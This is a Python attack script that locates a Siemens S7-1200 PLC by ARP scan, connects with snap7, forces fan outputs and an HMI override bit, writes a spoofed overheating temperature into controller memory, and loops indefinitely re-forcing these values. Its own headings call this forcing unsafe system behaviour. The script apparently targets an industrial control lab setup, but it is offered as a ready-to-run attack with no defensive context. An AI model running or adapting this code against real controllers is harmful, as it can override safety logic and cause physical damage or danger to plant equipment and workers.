import snap7
import time
import scapy.all as scapy
import struct

# --------------------
# 1. Find the PLC IP
# --------------------
def find_plc_ip():
    print("[+] Scanning network for Siemens PLC...")
    
    # Send an ARP request to find devices on the network
    arp_request = scapy.ARP(pdst="192.168.1.0/24")  # Adjust the subnet based on the target network
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    response = scapy.srp(broadcast / arp_request, timeout=2, verbose=False)[0]
    
    for sent, received in response:
        if "Siemens" in received.summary():  # Some Siemens PLCs may respond with "Siemens"
            print(f"[+] Found Siemens PLC at {received.psrc}")
            return received.psrc
    
    print("[-] No Siemens PLC found!")
    return None

# ---------------------
# 2. Connect to the PLC
# ---------------------
def connect_to_plc(ip):
    client = snap7.client.Client()
    try:
        client.connect(ip, 0, 1)  # Addressing the S7-1200 on rack 0, slot 1
        print(f"[+] Connected to PLC at {ip}")
        return client
    except Exception as e:
        print(f"[-] Unable to connect to PLC: {e}")
        return None

# -------------------------------
# 3. Force Unsafe System Behavior
# -------------------------------
def rogue_master_attack(client):
    
    # Define memory addresses based on the tag list provided
    ACTIVATE_FAN_A = 0  # %M0.0
    ACTIVATE_FAN_B = 1  # %M0.1
    MASTER_FAN_B_HMI = 5  # %M0.5
    OVERHEATING_CHECK = 2  # %M0.2
    MOTOR_TEMP_ADDR = 14  # %MW7 (Int value is 2 bytes, so address in bytes)

    print("[+] Manipulating PLC behavior...")

    # ---------------------
    # 3.1 - Force Fan Activation
    # ---------------------
    data = client.read_area(snap7.types.Areas.MK, 0, 0, 1)  # Read from Memory Bit area
    data = bytearray(data)

    data[0] |= (1 << ACTIVATE_FAN_A)  # Activate Fan A
    data[0] |= (1 << ACTIVATE_FAN_B)  # Activate Fan B
    data[0] |= (1 << MASTER_FAN_B_HMI)  # Manipulate HMI override

    client.write_area(snap7.types.Areas.MK, 0, 0, data)

    print("[+] Fans A and B Forced ON!")

    # ---------------------
    # 3.2 - Spoof Overheating Condition
    # ---------------------
    fake_temp = struct.pack(">h", 500)  # Convert 500 (High temp) to 2-byte value 
    client.write_area(snap7.types.Areas.MK, 0, MOTOR_TEMP_ADDR, fake_temp)
    
    print("[+] Overheated Motor Condition Injected!")

    # ---------------------
    # 3.3 - Override PLC Control Logic
    # ---------------------
    print("[+] Continuously Resetting Safe Conditions...")

    while True:
        data = client.read_area(snap7.types.Areas.MK, 0, 0, 1)
        data = bytearray(data)

        data[0] |= (1 << ACTIVATE_FAN_A)
        data[0] |= (1 << ACTIVATE_FAN_B)
        
        client.write_area(snap7.types.Areas.MK, 0, 0, data)
        
        time.sleep(1)  # Keep forcing changes

# ---------------------
# MAIN EXECUTION
# ---------------------
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    
    if plc_ip:
        client = connect_to_plc(plc_ip)
        if client:
            rogue_master_attack(client)
    else:
        print("[-] Unable to continue without PLC IP!")